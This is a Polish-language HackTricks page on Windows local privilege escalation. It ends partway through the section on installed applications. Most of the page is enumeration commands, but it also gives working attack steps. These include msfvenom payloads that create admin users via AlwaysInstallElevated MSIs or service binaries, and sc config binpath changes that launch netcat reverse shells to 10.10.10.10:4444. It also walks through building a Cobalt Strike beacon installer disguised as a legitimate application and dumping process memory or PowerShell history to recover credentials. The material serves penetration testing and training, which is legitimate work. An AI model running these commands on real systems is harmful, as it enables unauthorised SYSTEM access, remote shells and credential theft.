# Windows Eskalacja uprawnień lokalnych

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie z branży cyberbezpieczeństwa**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### **Najlepsze narzędzie do szukania wektorów eskalacji uprawnień lokalnych w systemie Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Początkowa teoria dotycząca systemu Windows

### Tokeny dostępu

**Jeśli nie wiesz, co to są tokeny dostępu w systemie Windows, przeczytaj następującą stronę, zanim będziesz kontynuować:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**Sprawdź następującą stronę, aby uzyskać więcej informacji na temat ACLs - DACLs/SACLs/ACEs:**

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### Poziomy integralności

**Jeśli nie wiesz, co to są poziomy integralności w systemie Windows, powinieneś przeczytać następującą stronę, zanim będziesz kontynuować:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Kontrole bezpieczeństwa systemu Windows

W systemie Windows istnieje wiele rzeczy, które mogą **uniemożliwić Ci wyliczenie systemu**, uruchomienie plików wykonywalnych lub nawet **wykrycie Twoich działań**. Powinieneś **przeczytać** następującą **stronę** i **wyliczyć** wszystkie te **mechanizmy obronne** przed rozpoczęciem wyliczania eskalacji uprawnień:

{% content-ref url="../authentication-credentials-uac-and-efs/" %}
[authentication-credentials-uac-and-efs](../authentication-credentials-uac-and-efs/)
{% endcontent-ref %}

## Informacje o systemie

### Wyliczenie informacji o wersji

Sprawdź, czy wersja systemu Windows ma jakieś znane podatności (sprawdź również zastosowane łatki).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Wykorzystanie wersji

Ta [strona](https://msrc.microsoft.com/update-guide/vulnerability) jest przydatna do wyszukiwania szczegółowych informacji na temat podatności związanych z bezpieczeństwem Microsoftu. Ta baza danych zawiera ponad 4 700 podatności związanych z bezpieczeństwem, pokazując **ogromną powierzchnię ataku**, jaką prezentuje środowisko Windows.

**Na systemie**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ma wbudowany watson)_

**Lokalnie z informacjami systemowymi**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repozytoria Github z eksploitami:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Środowisko

Czy jakiekolwiek dane uwierzytelniające/cenne informacje są zapisane w zmiennych środowiskowych?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### Historia PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Pliki transkryptów PowerShell

Możesz dowiedzieć się, jak to włączyć pod adresem [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### Logowanie modułu PowerShell

Szczegóły wykonania potoku PowerShell są rejestrowane, obejmując wykonane polecenia, wywołania poleceń i części skryptów. Jednakże pełne szczegóły wykonania i wyniki wyjściowe mogą nie zostać uchwycone.

Aby to włączyć, postępuj zgodnie z instrukcjami w sekcji "Pliki z zapisem" dokumentacji, wybierając **"Logowanie modułu"** zamiast **"Transkrypcji Powershell"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Aby wyświetlić ostatnie 15 zdarzeń z dziennika zdarzeń PowersShell, możesz wykonać:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Logowanie bloków skryptów**

Zapisywana jest kompletna aktywność i pełna treść wykonania skryptu, zapewniając, że każdy blok kodu jest udokumentowany podczas jego działania. Ten proces zachowuje kompleksowy ślad audytowy każdej aktywności, cenny do celów śledczych i analizy złośliwego zachowania. Dokumentując całą aktywność w czasie wykonania, zapewniane są szczegółowe wglądy w proces.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Rejestrowanie zdarzeń dla bloku skryptów można znaleźć w Podglądzie zdarzeń systemu Windows pod ścieżką: **Dzienniki aplikacji i usług > Microsoft > Windows > PowerShell > Operacyjne**.\
Aby wyświetlić ostatnie 20 zdarzeń, można użyć:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ustawienia internetowe
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Napędy
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Możesz skompromitować system, jeśli aktualizacje nie są żądane za pomocą protokołu http**S**, ale http.

Zacznij od sprawdzenia, czy sieć używa aktualizacji WSUS bez SSL, uruchamiając:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Jeśli otrzymasz odpowiedź w stylu:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
I jeśli `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` jest równe `1`.

Wtedy, **jest podatne na eksploatację**. Jeśli ostatni rejestr jest równy 0, to wpis WSUS zostanie zignorowany.

Aby wykorzystać te podatności, można użyć narzędzi takich jak: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Są to zbrojne skrypty eksploitów typu MiTM do wstrzykiwania 'fałszywych' aktualizacji do ruchu WSUS bez SSL.

Przeczytaj badania tutaj:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**Przeczytaj pełny raport tutaj**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
W zasadzie, to jest błąd, który eksploatuje ta luka:

> Jeśli mamy możliwość modyfikacji lokalnego proxy użytkownika i Windows Update używa skonfigurowanego w ustawieniach Internet Explorera proxy, mamy zatem możliwość uruchomienia [PyWSUS](https://github.com/GoSecure/pywsus) lokalnie, aby przechwycić własny ruch i uruchomić kod jako użytkownik z podwyższonymi uprawnieniami na naszym zasobie.
>
> Ponadto, ponieważ usługa WSUS używa ustawień bieżącego użytkownika, będzie również używać jego magazynu certyfikatów. Jeśli wygenerujemy samopodpisany certyfikat dla nazwy hosta WSUS i dodamy ten certyfikat do magazynu certyfikatów bieżącego użytkownika, będziemy mogli przechwycić zarówno ruch WSUS HTTP, jak i HTTPS. WSUS nie korzysta z mechanizmów podobnych do HSTS do wprowadzenia walidacji typu zaufanie przy pierwszym użyciu certyfikatu. Jeśli certyfikat przedstawiony jest zaufany przez użytkownika i ma poprawną nazwę hosta, zostanie zaakceptowany przez usługę.

Można wykorzystać tę podatność za pomocą narzędzia [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (gdy zostanie udostępnione).

## KrbRelayUp

Istnieje podatność na **lokalne eskalacje uprawnień** w środowiskach Windows **domenowych** pod określonymi warunkami. Warunki te obejmują środowiska, w których **podpisywanie LDAP nie jest wymuszone,** użytkownicy posiadają uprawnienia do konfigurowania **delegacji ograniczonej opartej na zasobach (RBCD),** oraz możliwość tworzenia komputerów w domenie. Ważne jest zauważenie, że te **wymagania** są spełnione przy użyciu **ustawień domyślnych**.

Znajdź eksploit w [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Aby uzyskać więcej informacji na temat przebiegu ataku, sprawdź [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

Jeśli te 2 rejestry są **włączone** (wartość to **0x1**), to użytkownicy dowolnych uprawnień mogą **instalować** (wykonywać) pliki `*.msi` jako NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Ładunki Metasploit
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Jeśli masz sesję meterpreter, możesz zautomatyzować tę technikę, używając modułu **`exploit/windows/local/always_install_elevated`**

### PowerUP

Użyj polecenia `Write-UserAddMSI` z power-up, aby utworzyć w bieżącym katalogu binarny plik Windows MSI do eskalacji uprawnień. Ten skrypt zapisuje skompilatora wcześniej zainstalowanego instalatora MSI, który prosi o dodanie użytkownika/grupy (więc będziesz potrzebować dostępu do GUI):
```
Write-UserAddMSI
```
### Wykonaj utworzony plik binarny, aby uzyskać podwyższone uprawnienia.

### Opakowanie MSI

Przeczytaj ten samouczek, aby dowiedzieć się, jak utworzyć opakowanie MSI za pomocą tych narzędzi. Zauważ, że możesz opakować plik "**.bat**" jeśli chcesz **tylko** wykonać **polecenia wiersza poleceń**

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### Utwórz MSI za pomocą WIX

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Utwórz MSI za pomocą Visual Studio

* **Generuj** za pomocą Cobalt Strike lub Metasploit **nowy ładunek TCP EXE systemu Windows** w `C:\privesc\beacon.exe`
* Otwórz **Visual Studio**, wybierz **Utwórz nowy projekt** i wpisz "installer" w pole wyszukiwania. Wybierz projekt **Kreatora instalacji** i kliknij **Dalej**.
* Nadaj projektowi nazwę, np. **AlwaysPrivesc**, użyj **`C:\privesc`** jako lokalizacji, wybierz **umieść rozwiązanie i projekt w tym samym katalogu**, a następnie kliknij **Utwórz**.
* Klikaj **Dalej** aż do kroku 3 z 4 (wybierz pliki do dołączenia). Kliknij **Dodaj** i wybierz ładunek Beacon, który właśnie wygenerowałeś. Następnie kliknij **Zakończ**.
* Zaznacz projekt **AlwaysPrivesc** w **Eksploratorze rozwiązań** i w **Właściwościach** zmień **TargetPlatform** z **x86** na **x64**.
* Możesz zmienić inne właściwości, takie jak **Autor** i **Producent**, co może sprawić, że zainstalowana aplikacja będzie wyglądać bardziej legalnie.
* Kliknij prawym przyciskiem myszy na projekcie i wybierz **Widok > Działania niestandardowe**.
* Kliknij prawym przyciskiem myszy **Zainstaluj** i wybierz **Dodaj działanie niestandardowe**.
* Dwukrotnie kliknij na **Folder aplikacji**, wybierz plik **beacon.exe** i kliknij **OK**. Zapewni to, że ładunek Beacon zostanie wykonany zaraz po uruchomieniu instalatora.
* W **Właściwościach działania niestandardowego** zmień **Run64Bit** na **True**.
* Na koniec **zbuduj to**.
* Jeśli pojawi się ostrzeżenie `Plik 'beacon-tcp.exe' kierujący do 'x64' nie jest zgodny z platformą docelową projektu 'x86'`, upewnij się, że ustawiasz platformę na x64.

### Instalacja MSI

Aby wykonać **instalację** złośliwego pliku `.msi` w **tle:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Aby wykorzystać tę podatność, możesz użyć: _exploit/windows/local/always\_install\_elevated_

## Programy antywirusowe i detektory

### Ustawienia audytu

Te ustawienia decydują, co jest **rejestrowane**, dlatego powinieneś zwrócić uwagę
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, jest interesujące wiedzieć, gdzie są wysyłane dzienniki.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** został zaprojektowany do **zarządzania hasłami lokalnego administratora**, zapewniając, że każde hasło jest **unikalne, zrandomizowane i regularnie aktualizowane** na komputerach dołączonych do domeny. Te hasła są bezpiecznie przechowywane w Active Directory i mogą być dostępne tylko przez użytkowników, którzy otrzymali wystarczające uprawnienia poprzez listy ACL, pozwalając im na przeglądanie haseł lokalnych administratorów, jeśli są autoryzowani.

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

Jeśli jest aktywny, **hasła w postaci tekstu jawnego są przechowywane w LSASS** (Local Security Authority Subsystem Service).\
[**Więcej informacji o WDigest na tej stronie**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ochrona LSA

Począwszy od systemu **Windows 8.1**, Microsoft wprowadził zwiększoną ochronę dla Lokalnego Organu Bezpieczeństwa (LSA), aby **zablokować** próby niezaufanych procesów **odczytu jego pamięci** lub wstrzyknięcia kodu, dodatkowo zabezpieczając system.\
[**Więcej informacji na temat Ochrony LSA tutaj**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Ochrona poświadczeń

**Ochrona poświadczeń** została wprowadzona w systemie **Windows 10**. Jej celem jest ochrona przechowywanych na urządzeniu poświadczeń przed zagrożeniami, takimi jak ataki typu pass-the-hash.| [**Więcej informacji na temat Ochrony poświadczeń tutaj.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Zachowane dane uwierzytelniające

**Dane uwierzytelniające domeny** są uwierzytelniane przez **Lokalny Władzę Bezpieczeństwa** (LSA) i wykorzystywane przez komponenty systemu operacyjnego. Gdy dane logowania użytkownika są uwierzytelniane przez zarejestrowany pakiet zabezpieczeń, zazwyczaj ustanawiane są dane uwierzytelniające domeny dla użytkownika.\
[**Więcej informacji na temat zachowanych danych uwierzytelniających tutaj**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Użytkownicy i Grupy

### Wyliczanie Użytkowników i Grup

Należy sprawdzić, czy jakiekolwiek z grup, do których należysz, mają interesujące uprawnienia.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Grupy uprzywilejowane

Jeśli **należysz do jakiejś grupy uprzywilejowanej, możesz mieć możliwość eskalacji uprawnień**. Dowiedz się więcej o grupach uprzywilejowanych i jak je wykorzystać do eskalacji uprawnień tutaj:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### Manipulacja tokenem

Dowiedz się więcej, czym jest **token** na tej stronie: [**Tokeny systemu Windows**](../authentication-credentials-uac-and-efs/#access-tokens).\
Sprawdź następną stronę, aby **dowiedzieć się więcej o interesujących tokenach** i jak je wykorzystać:

{% content-ref url="privilege-escalation-abusing-tokens.md" %}
[privilege-escalation-abusing-tokens.md](privilege-escalation-abusing-tokens.md)
{% endcontent-ref %}

### Zalogowani użytkownicy / Sesje
```bash
qwinsta
klist sessions
```
### Foldery domowe
```powershell
dir C:\Users
Get-ChildItem C:\Users
```
### Polityka hasła
```bash
net accounts
```
### Pobierz zawartość schowka
```bash
powershell -command "Get-Clipboard"
```
## Uruchamianie procesów

### Uprawnienia plików i folderów

Po pierwsze, **wypisanie procesów sprawdza hasła w wierszu polecenia procesu**.\
Sprawdź, czy możesz **nadpisać pewien działający plik binarny** lub czy masz uprawnienia do zapisu folderu z plikami binarnymi, aby wykorzystać ewentualne ataki [**przechwytywania DLL**](dll-hijacking/):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Zawsze sprawdzaj, czy są uruchomione możliwe [**debuggery electron/cef/chromium**, możesz je wykorzystać do eskalacji uprawnień](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Sprawdzanie uprawnień binarnych procesów**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Sprawdzanie uprawnień folderów binarnych procesów (****[**Przechwytywanie DLL**](dll-hijacking/)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Wydobywanie haseł z pamięci

Możesz utworzyć zrzut pamięci działającego procesu za pomocą **procdump** z sysinternals. Usługi takie jak FTP mają **poświadczenia w postaci zwykłego tekstu w pamięci**, spróbuj wykonać zrzut pamięci i odczytać poświadczenia.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Niestabilne aplikacje GUI

**Aplikacje działające jako SYSTEM mogą umożliwić użytkownikowi uruchomienie CMD lub przeglądanie katalogów.**

Przykład: "Pomoc i obsługa techniczna systemu Windows" (Windows + F1), wyszukaj "wiersz polecenia", kliknij "Kliknij, aby otworzyć wiersz polecenia"

## Usługi

Pobierz listę usług:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Uprawnienia

Możesz użyć **sc**, aby uzyskać informacje o usłudze
```bash
sc qc <service_name>
```
Zaleca się posiadanie binarnej aplikacji **accesschk** z _Sysinternals_, aby sprawdzić wymagany poziom uprawnień dla każdej usługi.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Zaleca się sprawdzenie, czy "Użytkownicy uwierzytelnieni" mogą modyfikować jakikolwiek usługę:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Możesz pobrać accesschk.exe dla systemu XP tutaj](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Włącz usługę

Jeśli masz ten błąd (na przykład z SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Możesz go włączyć, używając
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Należy pamiętać, że usługa upnphost zależy od SSDPSRV, aby działać (dla XP SP1)**

**Innym rozwiązaniem** tego problemu jest uruchomienie:
```
sc.exe config usosvc start= auto
```
### **Modyfikacja ścieżki binarnej usługi**

W przypadku, gdy grupa "Użytkownicy uwierzytelnieni" posiada **SERVICE\_ALL\_ACCESS** do usługi, możliwa jest modyfikacja wykonywalnego pliku binarnego usługi. Aby zmodyfikować i uruchomić **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Uruchom ponownie usługę
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Uprawnienia można eskalować poprzez różne uprawnienia:

* **SERVICE\_CHANGE\_CONFIG**: Pozwala na ponowną konfigurację binariów usługi.
* **WRITE\_DAC**: Umożliwia ponowną konfigurację uprawnień, co prowadzi do możliwości zmiany konfiguracji usługi.
* **WRITE\_OWNER**: Umożliwia przejęcie własności i ponowną konfigurację uprawnień.
* **GENERIC\_WRITE**: Dziedziczy zdolność do zmiany konfiguracji usługi.
* **GENERIC\_ALL**: Dziedziczy również zdolność do zmiany konfiguracji usługi.

Do wykrywania i eksploatacji tej podatności można wykorzystać _exploit/windows/local/service\_permissions_.

### Słabe uprawnienia binariów usług

**Sprawdź, czy możesz modyfikować binaria, który jest wykonywany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się binarny plik ([**DLL Hijacking**](dll-hijacking/))**.**\
Możesz uzyskać każdy binarny plik, który jest wykonywany przez usługę, korzystając z polecenia **wmic** (nie w system32) i sprawdzić swoje uprawnienia za pomocą **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Możesz również użyć **sc** i **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Uprawnienia modyfikacji rejestru usług

Należy sprawdzić, czy można modyfikować dowolny rejestr usług.\
Możesz **sprawdzić** swoje **uprawnienia** do rejestru usług wykonując:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Należy sprawdzić, czy **Użytkownicy uwierzytelnieni** lub **NT AUTHORITY\INTERACTIVE** posiadają uprawnienia `FullControl`. Jeśli tak, można zmienić ścieżkę wykonywanego binarnego pliku.

Aby zmienić ścieżkę wykonywanego binarnego pliku:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Uprawnienia do dodawania danych/dodawania podkatalogów w rejestrze usług

Jeśli masz to uprawnienie w rejestrze, oznacza to, że **możesz tworzyć podkatalogi z tego**. W przypadku usług systemu Windows jest to **wystarczające do wykonania arbitralnego kodu:**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Niezakodowane ścieżki usług

Jeśli ścieżka do pliku wykonywalnego nie jest w cudzysłowach, system Windows spróbuje wykonać każde zakończenie przed spacją.

Na przykład, dla ścieżki _C:\Program Files\Some Folder\Service.exe_ system Windows spróbuje wykonać:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
### Wylistuj wszystkie niezakodowane ścieżki usług, wyłączając te należące do wbudowanych usług systemu Windows:
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Możesz wykryć i wykorzystać** tę lukę z metasploitem: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć binarny plik usługi z metasploita:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Akcje przywracania

System Windows umożliwia użytkownikom określenie działań do podjęcia w przypadku awarii usługi. Ta funkcja może być skonfigurowana tak, aby wskazywała na plik binarny. Jeśli ten plik binarny jest wymienialny, możliwe jest eskalacja uprawnień. Więcej szczegółów można znaleźć w [oficjalnej dokumentacji](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia plików binarnych** (być może można nadpisać jeden z nich i uzyskać wyższe uprawnienia) oraz **folderów** ([Przechwytywanie DLL](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
